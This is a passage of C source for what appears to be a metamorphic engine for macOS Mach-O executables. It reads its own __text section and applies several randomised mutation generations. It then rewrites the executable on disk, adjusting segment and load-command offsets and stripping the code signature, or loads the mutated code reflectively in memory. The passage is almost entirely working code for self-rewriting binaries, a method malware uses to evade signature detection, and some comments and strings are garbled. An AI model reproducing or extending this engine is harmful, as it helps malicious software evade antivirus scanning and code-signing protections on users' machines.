    if (fstat(fd, &st) < 0) { close(fd); return false; }

    size_t binary_size = (size_t)st.st_size;
    uint8_t *binary_data = malloc(binary_size);
    if (!binary_data) { close(fd); return false; }

    if (read(fd, binary_data, binary_size) != (ssize_t)binary_size) {
        free(binary_data);
        close(fd);
        return false;
    }
    close(fd);

    // Validate Mach-O header
    struct mach_header_64 *mh = (struct mach_header_64 *)binary_data;
    if (mh->magic != MH_MAGIC_64) {
        DBG("Not a 64-bit V Vmagic = 0x%x)\n", mh->magic);
        free(binary_data);
        return false;
    }
    
    // Validate load commands and check for mutation stacking
    struct load_command *check_lc = (struct load_command *)((uint8_t *)mh + sizeof(*mh));
    uint8_t *cmds_end = (uint8_t *)mh + sizeof(*mh) + mh->sizeofcmds;
    
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        // Validate load command is within bounds
        if ((uint8_t *)check_lc + sizeof(struct load_command) > cmds_end) {
            DBG("Load command %u extends beyond command area\n", i);
            free(binary_data);
            return false;
        }
        
        if (check_lc->cmdsize < sizeof(struct load_command) || 
            (uint8_t *)check_lc + check_lc->cmdsize > cmds_end) {
            DBG("Invalid cmdsize for load command %u\n", i);
            free(binary_data);
            return false;
        }
        
        if (check_lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)check_lc;
            if (strcmp(seg->segname, "__TEXT") == 0) {
                // If __TEXT is already 3x+ the original size, something's wrong
                if (seg->filesize > original_size * 3) {
                    DBG("__TEXT segment already very large (0x%llx bytes), may be corrupted\n",
                        (unsigned long long)seg->filesize);
                }
                break;
            }
        }
        check_lc = (struct load_command *)((uint8_t *)check_lc + check_lc->cmdsize);
    }

    // Find __text section (original)
    text_section_t tsec;
    if (!text_sec(mh, &tsec)) {
        DBG("Couldn't find __text\n");
        free(binary_data);
        return false;
    }

    // Find file range of __TEXT segment (fileoff + filesize)
    uint64_t text_segment_fileoff = 0;
    uint64_t text_segment_fileend = 0;
    {
        struct load_command *lc = (struct load_command *)((uint8_t *)mh + sizeof(*mh));
        for (uint32_t i = 0; i < mh->ncmds; i++) {
            if (lc->cmd == LC_SEGMENT_64) {
                struct segment_command_64 *seg = (struct segment_command_64 *)lc;
                if (strcmp(seg->segname, "__TEXT") == 0) {
                    text_segment_fileoff = seg->fileoff;
                    text_segment_fileend  = seg->fileoff + seg->filesize;
                    break;
                }
            }
            lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
        }
    }

    if (text_segment_fileend == 0) {
        DBG("Couldn't determine __TEXT segment fileend\n");
        free(binary_data);
        return false;
    }

#if defined(__aarch64__) || defined(_M_ARM64)
    const size_t page_size = 0x4000;  // 16KB 
#else
    const size_t page_size = 0x1000;  // 4KB
#endif

    size_t growth = (mutated_size > original_size) ? (mutated_size - original_size) : 0;

    if (text_segment_fileend < text_segment_fileoff) {
        DBG("Invalid text segment bounds\n");
        free(binary_data);
        return false;
    }

    size_t old_text_segment_size = (size_t)(text_segment_fileend - text_segment_fileoff);

    // handy 
    if (growth > SIZE_MAX - old_text_segment_size) {
        DBG("Overflow computing new_text_segment_size\n");
        free(binary_data);
        return false;
    }
    size_t new_text_segment_size = old_text_segment_size + growth;
    size_t aligned_text_segment_size = ((new_text_segment_size + page_size - 1) / page_size) * page_size;

    size_t shift_amount;
    if (aligned_text_segment_size < old_text_segment_size) {
        DBG("Aligned size smaller than old size (overflow?)\n");
        free(binary_data);
        return false;
    } else {
        shift_amount = aligned_text_segment_size - old_text_segment_size;
    }

    if (shift_amount > SIZE_MAX - binary_size) {
        DBG("Overflow computing new_binary_size\n");
        free(binary_data);
        return false;
    }
    size_t new_binary_size = binary_size + shift_amount;

    DBG("Growth in __text: %zu bytes\n", growth);
    DBG("Text segment: 0x%zx bytes -> 0x%zx bytes (aligned)\n",
        old_text_segment_size, aligned_text_segment_size);
    DBG("Shift for segments after __TEXT: 0x%zx (%zu bytes)\n", shift_amount, shift_amount);

    uint8_t *new_binary = calloc(1, new_binary_size);
    if (!new_binary) {
        free(binary_data);
        return false;
    }

    // copy everything up to start of _tex
    if (tsec.file_start > new_binary_size) { free(new_binary); free(binary_data); return false; }
    memcpy(new_binary, binary_data, tsec.file_start);

    // write mutated code into place
    if (tsec.file_start + mutated_size > new_binary_size) { free(new_binary); free(binary_data); return false; }
    memcpy(new_binary + tsec.file_start, mutated_code, mutated_size);

    // copy rest
    size_t text_section_end = (size_t)(tsec.file_start + original_size);
    if (text_section_end > binary_size) { free(new_binary); free(binary_data); return false; }

    size_t rest_of_text_segment_size = 0;
    if (text_segment_fileend > text_section_end) {
        rest_of_text_segment_size = (size_t)(text_segment_fileend - text_section_end);
        if (text_section_end + growth + rest_of_text_segment_size > new_binary_size) {
            free(new_binary); free(binary_data); return false;
        }
        memcpy(new_binary + text_section_end + growth,
               binary_data + text_section_end,
               rest_of_text_segment_size);
    }

    // Fill gap between mutated code and next section with NOPs if any
    size_t gap_start = tsec.file_start + mutated_size;
    size_t gap_end = text_section_end + growth;
    if (gap_end > gap_start) {
        size_t gap_size = gap_end - gap_start;
#if defined(__aarch64__) || defined(_M_ARM64)
        for (size_t i = 0; i < gap_size; i += 4) {
            uint32_t nop = 0xD503201F;
            if (gap_start + i + 4 <= new_binary_size)
                memcpy(new_binary + gap_start + i, &nop, 4);
        }
#else
        if (gap_start + gap_size <= new_binary_size)
            memset(new_binary + gap_start, 0x90, gap_size);
#endif
    }

    // Pad to page boundary
    size_t new_text_segment_fileend = (size_t)(text_section_end + growth);
    size_t aligned_new_text_end = ((new_text_segment_fileend + page_size - 1) / page_size) * page_size;
    size_t padding_needed = 0;
    if (aligned_new_text_end > new_text_segment_fileend) {
        padding_needed = aligned_new_text_end - new_text_segment_fileend;
        if (aligned_new_text_end > new_binary_size) {
            free(new_binary); free(binary_data); return false;
        }
#if defined(__aarch64__) || defined(_M_ARM64)
        for (size_t i = 0; i < padding_needed; i += 4) {
            uint32_t nop = 0xD503201F;
            memcpy(new_binary + new_text_segment_fileend + i, &nop, 4);
        }
#else
        memset(new_binary + new_text_segment_fileend, 0x90, padding_needed);
#endif
    }

    // copy everything after original text segment to aligned_new_text_end
    size_t after_text_segment_size = 0;
    if (binary_size > text_segment_fileend) {
        after_text_segment_size = (size_t)(binary_size - text_segment_fileend);
        if (aligned_new_text_end + after_text_segment_size > new_binary_size) {
            free(new_binary); free(binary_data); return false;
        }
        memcpy(new_binary + aligned_new_text_end,
               binary_data + text_segment_fileend,
               after_text_segment_size);
    }

    DBG("Copied %zu bytes after __TEXT from 0x%llx to 0x%zx\n",
        after_text_segment_size, (unsigned long long)text_segment_fileend, aligned_new_text_end);

    // Now update V Veaders within new_binary consistently
    mh = (struct mach_header_64 *)new_binary;
    uint8_t *lc_ptr = (uint8_t *)mh + sizeof(struct mach_header_64);

    // find _TEXT vmaddr/vmsize
    bool found_text = false;
    uint64_t text_vmaddr = 0;
    uint64_t text_vmsize_old = 0;
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        if ((uint8_t *)lc_ptr + sizeof(struct load_command) > new_binary + new_binary_size) { free(new_binary); free(binary_data); return false; }
        struct load_command *lc = (struct load_command *)lc_ptr;
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            if (strcmp(seg->segname, "__TEXT") == 0) {
                text_vmaddr = seg->vmaddr;
                text_vmsize_old = seg->vmsize;
                found_text = true;
                break;
            }
        }
        lc_ptr += lc->cmdsize;
    }

    if (!found_text) {
        free(new_binary); free(binary_data);
        return false;
    }

    // update segments and sections
    lc_ptr = (uint8_t *)mh + sizeof(struct mach_header_64);
    bool seen_text_segment = false;
    struct load_command *codesig_lc = NULL;
    uint32_t codesig_cmdsize = 0;

    for (uint32_t i = 0; i < mh->ncmds; i++) {
        if ((uint8_t *)lc_ptr + sizeof(struct load_command) > new_binary + new_binary_size) { free(new_binary); free(binary_data); return false; }
        struct load_command *lc = (struct load_command *)lc_ptr;

        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;

            if (strcmp(seg->segname, "__TEXT") == 0) {
                uint64_t old_filesize = seg->filesize;
                
                if (growth > UINT64_MAX - old_filesize) {
                    DBG("Overflow expanding __TEXT filesize\n");
                    free(new_binary); free(binary_data); return false;
                }
                uint64_t new_filesize_u64 = old_filesize + growth;
                uint64_t aligned_filesize = ((new_filesize_u64 + page_size - 1) / page_size) * page_size;

                seg->filesize = aligned_filesize;
                seg->vmsize = aligned_filesize;
                seen_text_segment = true;

                DBG("__TEXT segment: filesize 0x%llx -> 0x%llx, vmsize 0x%llx -> 0x%llx\n",
                    (unsigned long long)old_filesize, (unsigned long long)seg->filesize,
                    (unsigned long long)text_vmsize_old, (unsigned long long)seg->vmsize);

                // Update sections within __TEXT
                struct section_64 *sections = (struct section_64 *)((uint8_t *)seg + sizeof(*seg));
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (strcmp(sections[j].sectname, "__text") == 0 &&
                        strcmp(sections[j].segname, "__TEXT") == 0) {
                        // set new _text size to mutated_size
                        sections[j].size = (uint64_t)mutated_size;
                        DBG("Section __text: size 0x%llx -> 0x%llx\n",
                            (unsigned long long)(sections[j].size - mutated_size + original_size),
                            (unsigned long long)sections[j].size);
                    } else {
                        // Shift file offset only
                        uint64_t sect_end_threshold = (uint64_t)(tsec.file_start + original_size);
                        if (sections[j].offset >= sect_end_threshold) {
                            uint64_t old_offset = sections[j].offset;
                            
                            if (sections[j].offset > UINT64_MAX - growth) {
                                DBG("Overflow on section offset update for %s\n", sections[j].sectname);
                                free(new_binary); free(binary_data); return false;
                            }
                            sections[j].offset += (uint32_t)growth;
                            
                            // VM address stays relative to __TEXT base - no shift needed
                            DBG("Section %s: offset 0x%llx->0x%llx (addr unchanged: 0x%llx)\n",
                                sections[j].sectname, (unsigned long long)old_offset, 
                                (unsigned long long)sections[j].offset,
                                (unsigned long long)sections[j].addr);
                        }
                    }
                }
            } else if (seen_text_segment) {
                // For segments only shift fileoff, NOT vmaddr
                // vmaddr is a virtual memory address that should remain stable
                // Only __LINKEDIT and zero-fill segments need fileoff adjustment
                if (seg->fileoff >= text_segment_fileend && seg->fileoff > 0) {
                    uint64_t old_fileoff = seg->fileoff;

                    if (seg->fileoff > UINT64_MAX - shift_amount) {
                        DBG("Overflow when shifting segment %s\n", seg->segname);
                        free(new_binary); free(binary_data); return false;
                    }

                    seg->fileoff += (uint64_t)shift_amount;

                    DBG("Segment %s: fileoff shifted by 0x%zx to 0x%llx (vmaddr unchanged: 0x%llx)\n",
                        seg->segname, shift_amount, (unsigned long long)seg->fileoff,
                        (unsigned long long)seg->vmaddr);

                    // Shift section file offsets only (not addresses)
                    struct section_64 *sections = (struct section_64 *)((uint8_t *)seg + sizeof(*seg));
                    for (uint32_t j = 0; j < seg->nsects; j++) {
                        if (sections[j].offset > 0) {
                            if (sections[j].offset > UINT64_MAX - shift_amount) {
                                DBG("Overflow on section offset for %s.%s\n", seg->segname, sections[j].sectname);
                                free(new_binary); free(binary_data); return false;
                            }
                            sections[j].offset += (uint32_t)shift_amount;
                        }
                        // t's a VM address
                    }
                }
            }
        }

        lc_ptr += lc->cmdsize;
    }

    lc_ptr = (uint8_t *)mh + sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        if ((uint8_t *)lc_ptr + sizeof(struct load_command) > new_binary + new_binary_size) { free(new_binary); free(binary_data); return false; }
        struct load_command *lc = (struct load_command *)lc_ptr;

        if (lc->cmd == LC_MAIN) {
            struct entry_point_command *ep = (struct entry_point_command *)lc;
            if (ep->entryoff >= (uint64_t)(tsec.file_start + original_size)) {
                if (ep->entryoff > UINT64_MAX - shift_amount) { free(new_binary); free(binary_data); return false; }
                DBG("Updating LC_MAIN entryoff: 0x%llx -> 0x%llx\n",
                    (unsigned long long)ep->entryoff, (unsigned long long)(ep->entryoff + shift_amount));
                ep->entryoff += (uint64_t)shift_amount;
            } else {
                DBG("LC_MAIN entryoff 0x%llx is within __text, keeping as-is\n", (unsigned long long)ep->entryoff);
            }
        } else if (lc->cmd == LC_SYMTAB) {
            struct symtab_command *symtab = (struct symtab_command *)lc;
            uint32_t old_symoff = symtab->symoff;
            uint32_t old_stroff = symtab->stroff;
            
            if (symtab->symoff > 0 && symtab->symoff >= text_segment_fileend) {
                if (symtab->symoff > UINT32_MAX - shift_amount) {
                    DBG("Overflow on symoff\n");
                    free(new_binary); free(binary_data); return false;
                }
                symtab->symoff += shift_amount;
            }
            if (symtab->stroff > 0 && symtab->stroff >= text_segment_fileend) {
                if (symtab->stroff > UINT32_MAX - shift_amount) {
                    DBG("Overflow on stroff\n");
                    free(new_binary); free(binary_data); return false;
                }
                symtab->stroff += shift_amount;
            }
            
            DBG("LC_SYMTAB: symoff 0x%x->0x%x, stroff 0x%x->0x%x\n",
                old_symoff, symtab->symoff, old_stroff, symtab->stroff);
        } else if (lc->cmd == LC_DYSYMTAB) {
            struct dysymtab_command *dysymtab = (struct dysymtab_command *)lc;
            if (dysymtab->tocoff > 0 && dysymtab->tocoff >= text_segment_fileend) dysymtab->tocoff += shift_amount;
            if (dysymtab->modtaboff > 0 && dysymtab->modtaboff >= text_segment_fileend) dysymtab->modtaboff += shift_amount;
            if (dysymtab->extrefsymoff > 0 && dysymtab->extrefsymoff >= text_segment_fileend) dysymtab->extrefsymoff += shift_amount;
            if (dysymtab->indirectsymoff > 0 && dysymtab->indirectsymoff >= text_segment_fileend) dysymtab->indirectsymoff += shift_amount;
            if (dysymtab->extreloff > 0 && dysymtab->extreloff >= text_segment_fileend) dysymtab->extreloff += shift_amount;
            if (dysymtab->locreloff > 0 && dysymtab->locreloff >= text_segment_fileend) dysymtab->locreloff += shift_amount;
        } else if (lc->cmd == LC_DYLD_INFO || lc->cmd == LC_DYLD_INFO_ONLY) {
            struct dyld_info_command *dyld_info = (struct dyld_info_command *)lc;
            if (dyld_info->rebase_off > 0 && dyld_info->rebase_off >= text_segment_fileend) dyld_info->rebase_off += shift_amount;
            if (dyld_info->bind_off > 0 && dyld_info->bind_off >= text_segment_fileend) dyld_info->bind_off += shift_amount;
            if (dyld_info->weak_bind_off > 0 && dyld_info->weak_bind_off >= text_segment_fileend) dyld_info->weak_bind_off += shift_amount;
            if (dyld_info->lazy_bind_off > 0 && dyld_info->lazy_bind_off >= text_segment_fileend) dyld_info->lazy_bind_off += shift_amount;
            if (dyld_info->export_off > 0 && dyld_info->export_off >= text_segment_fileend) dyld_info->export_off += shift_amount;
        } else if (lc->cmd == LC_FUNCTION_STARTS || lc->cmd == LC_DATA_IN_CODE) {
            struct linkedit_data_command *data = (struct linkedit_data_command *)lc;
            if (data->dataoff > 0 && data->dataoff >= text_segment_fileend) data->dataoff += shift_amount;
        } else if (lc->cmd == LC_CODE_SIGNATURE) {
            // Mark for removal for later 
            codesig_lc = lc;
            codesig_cmdsize = lc->cmdsize;
        }

        lc_ptr += lc->cmdsize;
    }

    if (codesig_lc && codesig_cmdsize > 0) {
        uint8_t *cmds_base = (uint8_t *)mh + sizeof(*mh);
        uint8_t *cmds_end = cmds_base + mh->sizeofcmds;
        uint8_t *sig_ptr = (uint8_t *)codesig_lc;
        uint8_t *next_ptr = sig_ptr + codesig_cmdsize;

        if (sig_ptr < cmds_base || sig_ptr + codesig_cmdsize > cmds_end) {
            DBG("LC_CODE_SIGNATURE lies outside load commands area\n");
        } else {
            size_t remaining = (size_t)(cmds_end - next_ptr);
            if (remaining > 0) {
                memmove(sig_ptr, next_ptr, remaining);
            }
            memset(cmds_base + mh->sizeofcmds - codesig_cmdsize, 0, codesig_cmdsize);

            mh->ncmds -= 1;
            mh->sizeofcmds -= codesig_cmdsize;
        }
    }

    // Write to temp file + atomic rename
    char temp_path[PATH_MAX];
    snprintf(temp_path, sizeof(temp_path), "%s.tmp.%d", binary_path, getpid());

    int temp_fd = open(temp_path, O_WRONLY | O_CREAT | O_EXCL, st.st_mode);
    if (temp_fd < 0) {
        panic();
        free(new_binary);
        free(binary_data);
        return false;
    }

    ssize_t written = write(temp_fd, new_binary, new_binary_size);
    if (written != (ssize_t)new_binary_size) {
        close(temp_fd);
        unlink(temp_path);
        free(new_binary);
        free(binary_data);
        return false;
    }

    if (fsync(temp_fd) != 0) {
        close(temp_fd);
        unlink(temp_path);
        free(new_binary);
        free(binary_data);
        return false;
    }
    close(temp_fd);

    struct mach_header_64 *verify_mh = (struct mach_header_64 *)new_binary;
    if (verify_mh->magic != MH_MAGIC_64) {
        unlink(temp_path);
        free(new_binary);
        free(binary_data);
        return false;
    }

    text_section_t verify_tsec;
    if (!text_sec(verify_mh, &verify_tsec)) {
        DBG("can't find __text section in new binary\n");
        unlink(temp_path);
        free(new_binary);
        free(binary_data);
        return false;
    }

    if (verify_tsec.file_start != tsec.file_start) {
        DBG("__text moved from 0x%llx to 0x%llx\n",
            (unsigned long long)tsec.file_start, (unsigned long long)verify_tsec.file_start);
        unlink(temp_path);
        free(new_binary);
        free(binary_data);
        return false;
    }
    
    lc_ptr = (uint8_t *)verify_mh + sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < verify_mh->ncmds; i++) {
        if ((uint8_t *)lc_ptr + sizeof(struct load_command) > new_binary + new_binary_size) break;
        struct load_command *lc = (struct load_command *)lc_ptr;
        
        if (lc->cmd == LC_SYMTAB) {
            struct symtab_command *symtab = (struct symtab_command *)lc;
            
            if (symtab->symoff > 0) {
                size_t symtab_end = (size_t)symtab->symoff + (size_t)symtab->nsyms * 16;
                if (symtab_end > new_binary_size) {
                    DBG("symtab extends beyond file (0x%x + %u*16 = 0x%zx > 0x%zx)\n",
                        symtab->symoff, symtab->nsyms, symtab_end, new_binary_size);
                    unlink(temp_path);
                    free(new_binary);
                    free(binary_data);
                    return false;
                }
            }
            
            if (symtab->stroff > 0) {
                size_t strtab_end = (size_t)symtab->stroff + (size_t)symtab->strsize;
                if (strtab_end > new_binary_size) {
                    DBG("strtab extends beyond file (0x%x + 0x%x = 0x%zx > 0x%zx)\n",
                        symtab->stroff, symtab->strsize, strtab_end, new_binary_size);
                    unlink(temp_path);
                    free(new_binary);
                    free(binary_data);
                    return false;
                }
            }
            
            break;
        }
        
        lc_ptr += lc->cmdsize;
    }

    // Atomic rename
    if (rename(temp_path, binary_path) != 0) {
        DBG("Failed to rename: %s\n", strerror(errno));
        unlink(temp_path);
        free(new_binary);
        free(binary_data);
        return false;
    }

    {
        char dirbuf[PATH_MAX];
        strncpy(dirbuf, binary_path, sizeof(dirbuf));
        dirbuf[sizeof(dirbuf) - 1] = '\0';
        char *d = dirname(dirbuf);
        int dfd = open(d, O_DIRECTORY | O_RDONLY);
        if (dfd >= 0) {
            fsync(dfd);
            close(dfd);
        }
    }

    DBG("Success! %zu -> %zu bytes (+%.1f%%)\n",
        binary_size, new_binary_size,
        100.0 * (new_binary_size - binary_size) / (double)binary_size);

    free(new_binary);
    free(binary_data);
    return true;
}



int mutator(void) {
    char pathbuf[PATH_MAX];
    uint32_t psize = sizeof(pathbuf);
    if (_NSGetExecutablePath(pathbuf, &psize) != 0) return 1;
    
    // Each run creates a new mutation
    struct mach_header_64 *mh = (struct mach_header_64 *)&_mh_execute_header;
    text_section_t tsec;
    
    if (!text_sec(mh, &tsec)) return 1;
    
    size_t text_size = tsec.vm_end - tsec.vm_start; 
    
    // Get the ACTUAL runtime address with ASLR slide
    intptr_t slide = img_slide(mh);
    uint8_t *runtime_text_base = (uint8_t *)tsec.vm_start;
    
    DBG("Text section: file=0x%llx-0x%llx, vm=0x%llx-0x%llx, slide=0x%lx, runtime=%p\n",
        tsec.file_start, tsec.file_end, tsec.vm_start, tsec.vm_end, slide, runtime_text_base);
    
    int fd = open(pathbuf, O_RDONLY);
    if (fd < 0) return 1;
    
    struct stat file_stat;
    if (fstat(fd, &file_stat) < 0) {
        close(fd);
        return 1;
    }
    
    size_t actual_file_size = (size_t)file_stat.st_size;
    
    uint8_t *original_text = malloc(text_size);
    if (!original_text) {close(fd); return 1;}
    
    if (lseek(fd, (off_t)tsec.file_start, SEEK_SET) == (off_t)-1 ||
        read(fd, original_text, text_size) != (ssize_t)text_size) {
        free(original_text);
        close(fd);
        return 1;
    }
    close(fd);
    
#ifdef FOO
    // In FOO mode, if we already expanded
    double size_ratio = (double)actual_file_size / (double)text_size;
    bool already_expanded = (size_ratio > 2.2);  
    
    DBG("Binary size: %zu bytes, text: %zu bytes, ratio: %.2fx\n",
        actual_file_size, text_size, size_ratio);
    
    if (already_expanded) {
        free(original_text);
        return 0;  // pass 
    }
#endif

    
    context_t ctx;
    if (!tx_Init(&ctx, original_text, text_size, mh, tsec.vm_start)) {
        free(original_text);
        return 1;
    }
    
    // After multiple generations, the binary becomes fragile
    size_t max_allowed_size = text_size * 2;
    if (text_size > 200000) { 
        max_allowed_size = text_size + 2048;  //  Minimal 
        DBG("Binary already large (%zu bytes), limiting growth to +2KB\n", text_size);
    }
    
    // We're not corrupting our own code
    DBG("Protected regions: %zu\n", ctx.numcheck);
    for (size_t i = 0; i < ctx.numcheck && i < 10; i++) {
        DBG("  Region %zu: 0x%llx - 0x%llx\n", i, 
            ctx.ranges[i*2], ctx.ranges[i*2+1]);
    }
    
    uint8_t *backup = malloc(text_size);
    if (!backup) {
        clear_tx(&ctx);
        free(original_text);
        return 1;
    }
    
    // Randomize 
    unsigned max_generations = 2 + (chacha20_random(&ctx.rng) % 3);  
    bool success = false;
    bool mutated = false;
    
    DBG("Applying %u mutation generation(s)\n", max_generations);
    
    for (unsigned gen = 1; gen <= max_generations; gen++) {
        memcpy(backup, ctx.working_code, MIN(ctx.codesz, text_size));
        size_t backup_size = ctx.codesz;
        
        if (!mOrph(&ctx, gen, max_allowed_size)) {
            DBG("Generation %u failed, rolling back\n", gen);
            memcpy(ctx.working_code, backup, text_size);
            ctx.codesz = backup_size;
            break;
        }
        
        if (memcmp(ctx.working_code, backup, MIN(ctx.codesz, text_size)) != 0) {
            mutated = true;
            DBG("Generation %u: Code mutated successfully\n", gen);
        }
    }
    
    if (mutated) {
        DBG("Original size: %zu bytes\n", text_size);
        DBG("Mutated size:  %zu bytes\n", ctx.codesz);
        DBG("Growth:        %+zd bytes (%.1f%%)\n", 
            (ssize_t)ctx.codesz - (ssize_t)text_size,
            100.0 * (ctx.codesz - text_size) / text_size);
        DBG("Generations:   %u\n", max_generations);
        DBG("Mutations:     %zu entries\n", ctx.muttation.count);
        
#ifdef FOO
        // Use injection 
        success = dsk_mut(&ctx, pathbuf, tsec.file_start, text_size);
        
        if (success) {
            panic();
        } else {
            DBG("[!] Disk mutation failed\n");
        }
#else
        // Reflective loading expansion allowed
        if (!is_chunk_ok(ctx.working_code, ctx.codesz)) {
            printf("[!] Mutated code failed validation\n");
            printf("   Rolling back to original code\n");
            success = false;
        } else {
            printf("[+] Mutated code validated\n");
            
            success = mem_mut(&ctx, runtime_text_base, text_size);
            
            if (!success) {
                printf("[!] Reflective loading failed\n");
            }
        }
#endif
    } else {
        // We can't have this 
        DBG("[!] No mutations\n");
        panic();
    }

    free(backup);
    clear_tx(&ctx);
    free(original_text);
    
    return success ? 0 : 1;
}
